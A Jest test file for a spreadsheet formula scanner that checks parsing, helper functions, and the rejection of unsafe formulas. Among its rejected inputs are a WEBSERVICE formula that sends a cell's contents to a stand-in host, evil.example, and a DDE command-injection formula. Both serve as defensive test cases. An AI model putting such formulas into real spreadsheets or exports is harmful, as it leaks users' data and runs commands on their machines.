import { expandTemplate, maskStrings, scanFormula, unknownPlaceholders } from "../src/core/formula";
import { formatRange } from "../src/core/a1";

describe("scanFormula", () => {
  it("accepts a normal formula and finds functions + references", () => {
    const s = scanFormula("=SUM(A2:A10)/COUNT(Data!B2:B10)");
    expect(s.errors).toEqual([]);
    expect(s.functions).toEqual(["SUM", "COUNT"]);
    expect(s.references.map((r) => formatRange(r, true))).toEqual(["A2:A10", "Data!B2:B10"]);
  });

  it("does not mistake function names like LOG10( for cell refs", () => {
    const s = scanFormula("=LOG10(A1)");
    expect(s.functions).toEqual(["LOG10"]);
    expect(s.references.map((r) => formatRange(r))).toEqual(["A1"]);
  });

  it("ignores text inside string literals", () => {
    const s = scanFormula('="WEBSERVICE(" & A1 & ")"');
    expect(s.errors).toEqual([]);
    expect(s.functions).toEqual([]);
  });

  it.each([
    ["SUM(A1)", "start with"],
    ["=SUM(A1", "Unbalanced"],
    ["=SUM(A1))", "Unbalanced"],
    ['="abc', "Unterminated"],
    ['=WEBSERVICE("https://evil.example/?d="&A1)', "blocked"],
    ["=cmd|'/c calc'!A0", "DDE"],
    ["=[Budget.xlsx]Sheet1!A1", "other workbooks"],
  ])("rejects %s", (formula, msg) => {
    expect(scanFormula(formula).errors.join(" ")).toContain(msg);
  });

  it("warns (but allows) INDIRECT", () => {
    const s = scanFormula('=INDIRECT("A"&B1)');
    expect(s.errors).toEqual([]);
    expect(s.warnings[0]).toContain("INDIRECT");
  });

  it("allows structured table references", () => {
    expect(scanFormula("=SUM(Sales[Amount])").errors).toEqual([]);
  });
});

describe("helpers", () => {
  it("masks strings but keeps length", () => {
    expect(maskStrings('="a""b"&1')).toBe('="    "&1');
  });
  it("expands templates", () => {
    expect(expandTemplate("=B{row}*{col}1", 5, "C")).toBe("=B5*C1");
  });
  it("flags unknown placeholders but not array constants", () => {
    expect(unknownPlaceholders("=B{r}+{1,2}")).toEqual(["r"]);
  });
});
